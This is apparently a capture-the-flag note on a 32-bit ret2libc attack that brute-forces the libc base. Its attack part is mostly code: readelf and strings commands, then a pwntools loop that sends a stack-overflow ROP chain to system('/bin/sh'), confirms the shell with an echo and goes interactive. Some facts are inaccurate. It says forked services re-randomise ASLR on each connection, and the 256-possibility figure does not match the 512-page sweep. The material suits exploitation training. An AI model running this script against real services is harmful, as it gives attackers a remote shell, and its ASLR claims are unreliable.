# ret2libc (32-bit, libc-base brute-force)

Classic **ret2libc** when you have no memory leak: on 32-bit, ASLR entropy for the libc base is low enough to **brute-force** the address instead of leaking it.

## When to reach for it

- 32-bit binary, NX on, no PIE or a known binary base, but **no leak** of libc.
- Stack overflow with a controllable return address.
- You were handed (or can identify) the exact `libc.so.6` in use.

i386 ASLR randomizes the mmap base over only ~8 bits (256 possibilities, ~4 KiB-aligned pages over a narrow range), so a fork-based service lets you retry until the guess lands. 64-bit entropy (~28–32 bits) makes this impractical — leak instead.

## How it works

The libc base is chosen from a small set of page-aligned addresses. Pick a candidate base, compute `system` / `exit` / `"/bin/sh"` from it, send the ROP chain, and detect success by the shell response. The target forks per connection, so ASLR is re-rolled each attempt until your guess matches.

## Minimal steps

1. Find the overflow offset (e.g. `cyclic`/`cyclic_find`) and confirm `system`/`exit`/`"/bin/sh"` offsets in the supplied libc:
   ```bash
   readelf -s libc.so.6 | grep -E ' (system|exit|__exit)@@'
   strings -a -t x libc.so.6 | grep '/bin/sh'
   ```
2. Sweep candidate bases page by page over the plausible range (i386 typically `0xf7c00000`–`0xf7e00000`):
   ```python
   from pwn import *

   libc = ELF('./libc.so.6')
   for base in range(0xf7c00000, 0xf7e00000, 0x1000):
       io = remote(host, port)
       payload = flat(
           b'A' * 76,                 # offset
           base + libc.symbols['system'],
           base + libc.symbols['exit'],
           base + next(libc.search(b'/bin/sh')),
       )
       io.sendline(payload)
       try:
           io.sendline(b'echo PWNED')
           if b'PWNED' in io.recv(timeout=1):
               io.interactive()
               break
       except EOFError:
           continue                       # crash: wrong base, retry
       finally:
           io.close()
   ```
3. Keep the base increment at the page size (`0x1000`) unless the offset is low; adjust the range to match the binary/target.

## Notes

- Verify your libc matches the target (`ldd`/`libc.so.6` exactly); an off-by-version libc gives wrong offsets.
- If a partial leak exists, prefer that over brute-forcing. See `categories/pwn/notes/ret2syscall.md` for the no-libc approach.
